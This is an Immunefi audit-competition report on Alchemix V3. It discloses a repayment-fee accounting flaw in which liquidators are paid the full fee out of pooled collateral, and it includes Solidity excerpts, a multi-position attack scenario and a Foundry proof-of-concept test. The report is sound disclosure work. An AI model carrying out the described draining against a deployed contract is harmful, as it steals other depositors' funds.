# 58125 sc critical repayment fee overpayment from pooled collateral

**Submitted on Oct 30th 2025 at 19:59:14 UTC by @xanony for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58125
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

## Brief/Intro

When a liquidation involves only earmarked debt repayment (without further liquidation), the protocol pays the liquidator a repayment fee calculated as `fee = repaidAmount * repaymentFee / BPS`. However, **the fee is transferred unconditionally from the contract's pooled collateral**, while the victim's account is only debited by `min(fee, account.collateralBalance)`.

If the account lacks sufficient collateral to cover the fee, the shortfall is **implicitly socialized** across all depositors' pooled collateral, resulting in:

* **Direct theft of user funds** from the shared collateral pool
* Silent value leakage to liquidators beyond what was deducted from the liquidated account
* Accounting mismatch between events logged and actual state changes

## Vulnerability Details

### Affected Components

* **Contract**: `src/AlchemistV3.sol`
* **Functions**:
  * `_resolveRepaymentFee()` (lines 903-909) - calculates fee, debits only `min(fee, balance)`
  * `_liquidate()` (lines 793-850) - transfers full `feeInYield` to liquidator unconditionally

### Root Cause

The vulnerability stems from a mismatch between fee deduction and fee payout:

**Fee Calculation & Deduction** (`_resolveRepaymentFee`):

```solidity
function _resolveRepaymentFee(uint256 accountId, uint256 repaidAmountInYield) internal returns (uint256 fee) {
    Account storage account = _accounts[accountId];
    
    // Calculate full fee
    fee = repaidAmountInYield * repaymentFee / BPS;
    
    account.collateralBalance -= fee > account.collateralBalance ? account.collateralBalance : fee;
    
    emit RepaymentFee(accountId, repaidAmountInYield, msg.sender, fee);
    return fee; // Returns FULL fee regardless of actual deduction
}
```

**Fee Payout** (`_liquidate` repayment-only path):

```solidity
function _liquidate(uint256 accountId) internal returns (...) {
    // ... earmark repayment logic ...
    
    if (account.debt == 0) {
        // Repayment restored health, pay fee and exit
        feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);
        
        TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
        
        return (repaidAmountInYield, feeInYield, 0);
    }
    // ...
}
```

**The Problem**:

1. `_resolveRepaymentFee` returns the **full calculated fee**
2. But only debits `min(fee, account.collateralBalance)` from the account
3. `_liquidate` transfers the **full fee** to liquidator from contract balance
4. **Gap**: `fee - min(fee, balance)` is paid from other users' pooled collateral

**Mathematical Example**:

```
Account State:
- Earmarked debt: 100 tokens  
- Collateral balance: 2 tokens (insufficient)
- repaymentFee: 1000 BPS (10%)

Execution:
1. Repay 100 tokens of earmarked debt
2. Calculate fee: 100 * 0.10 = 10 tokens
3. Debit from account: min(10, 2) = 2 tokens 
4. Transfer to liquidator: 10 tokens 
5. Shortfall: 10 - 2 = 8 tokens stolen from pool
```

## Impact Details

### Direct Impact

* **Theft of Pooled Collateral**: Liquidators receive more than what was actually deducted from the liquidated account
* **Socialized Losses**: Other depositors' collateral is silently drained to cover the shortfall
* **Accounting Mismatch**: `RepaymentFee` event logs the theoretical fee, not the actual deduction
* **Protocol Insolvency Risk**: Repeated exploitation could drain the collateral pool

### Attack Scenario

1. Attacker creates multiple positions with minimal collateral
2. Mints maximum debt and immediately gets earmarked
3. Allows positions to become liquidatable
4. Accomplice liquidator calls `liquidate()` on each position
5. Each liquidation:
   * Deducts small collateral from account (\~1-5 tokens)
   * Pays full fee from pool (\~10-50 tokens)
   * Profit: 90-98% from other users' funds

### Funds at Risk

**Per-liquidation loss**:

* Repayment amount: $10,000
* Repayment fee: 5% = $500
* Account collateral: $50
* **Loss from pool**: $450 per liquidation

**Systemic exposure**:

* Average protocol TVL: $100M
* Positions with low collateral: \~5% = $5M
* Potential theft if all liquidated: $5M \* 5% \* 90% = **$225k stolen from pool**

## References

* Vulnerable contract: `https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol`
* Fee calculation: Lines 903-909 (`_resolveRepaymentFee`)
* Fee payout: Lines 820-823, 845-848 (`_liquidate`)

## Link to Proof of Concept

<https://gist.github.com/leojay-net/6e50339084321c8343b7a8da17e68683>

## Proof of Concept

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "forge-std/console.sol";
import {AlchemistV3Test} from "./AlchemistV3.t.sol";
import {SafeERC20} from "../libraries/SafeERC20.sol";
import {IERC20} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {IMockYieldToken} from "./mocks/MockYieldToken.sol";
import {AlchemistNFTHelper} from "./libraries/AlchemistNFTHelper.sol";

contract RepaymentFeeOverpaymentStandalonePoC is AlchemistV3Test {


    function testBug_RepaymentFee_PaidBeyondAccountCollateral() external {
        // Arrange: increase repayment fee to 20%
        vm.startPrank(alOwner);
        alchemist.setRepaymentFee(2_000); // 20%
        vm.stopPrank();

        // Keep global collateralization healthy
        vm.startPrank(someWhale);
        IMockYieldToken(mockStrategyYieldToken).mint(whaleSupply, someWhale);
        vm.stopPrank();

        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount * 2);
        alchemist.deposit(depositAmount, yetAnotherExternalUser, 0);
        vm.stopPrank();

        // Create victim position and mint up to min collateralization
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount + 100e18);
        alchemist.deposit(depositAmount, address(0xbeef), 0);
        uint256 tokenIdFor0xBeef = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        uint256 mintAmount = (alchemist.totalValue(tokenIdFor0xBeef) * FIXED_POINT_SCALAR) / minimumCollateralization;
        alchemist.mint(tokenIdFor0xBeef, mintAmount, address(0xbeef));
        vm.stopPrank();

        // Start a redemption to earmark debt and advance to 100% earmarked
        vm.startPrank(anotherExternalUser);
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), mintAmount);
        transmuterLogic.createRedemption(mintAmount);
        vm.stopPrank();

        vm.roll(block.number + (5_256_000));

        (uint256 prevCollateral, uint256 prevDebt, uint256 earmarked) = alchemist.getCDP(tokenIdFor0xBeef);
        require(earmarked == prevDebt, "earmarked == debt");

        // Slight price move to ensure undercollateralized and repayment-only path triggers
        uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply);
        uint256 modifiedVaultSupply = ((initialVaultSupply * 590) / 10_000) + initialVaultSupply; // +5.9%
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(modifiedVaultSupply);

        // Act: liquidate; only repayment should happen, paying repayment fee to caller
        vm.startPrank(externalUser);
        uint256 liquidatorPrevTokenBalance = IERC20(address(vault)).balanceOf(address(externalUser));
        (uint256 repaidAmountInYield, uint256 feeInYield, ) = alchemist.liquidate(tokenIdFor0xBeef);
        uint256 liquidatorPostTokenBalance = IERC20(address(vault)).balanceOf(address(externalUser));
        vm.stopPrank();

        // Compute leftover collateral after repayment, before fee deduction
        uint256 leftoverBeforeFee = prevCollateral - repaidAmountInYield; // protocolFee is 0 in this test

        // Post-state of victim
        (uint256 postCollateral, , ) = alchemist.getCDP(tokenIdFor0xBeef);

        // Only min(fee, leftover) is deducted from the account
        uint256 actuallyDeductedForFee = leftoverBeforeFee > feeInYield ? feeInYield : leftoverBeforeFee;

        // Assert: liquidator received the full feeInYield
        assertEq(liquidatorPostTokenBalance, liquidatorPrevTokenBalance + feeInYield, "liquidator received full fee");

        // Assert: account paid only min(fee, leftover)
        assertEq(
            postCollateral,
            prevCollateral - repaidAmountInYield - actuallyDeductedForFee,
            "account deducted only min(fee,leftover)"
        );

        // Crucially, show that leftover < fee => shortfall socialized from pooled collateral
        assertLt(leftoverBeforeFee, feeInYield, "leftover < feeInYield required for socialization");
        uint256 shortfall = feeInYield - actuallyDeductedForFee;
        assertGt(shortfall, 0, "shortfall > 0 implies pooled overpay");
    }

}

```
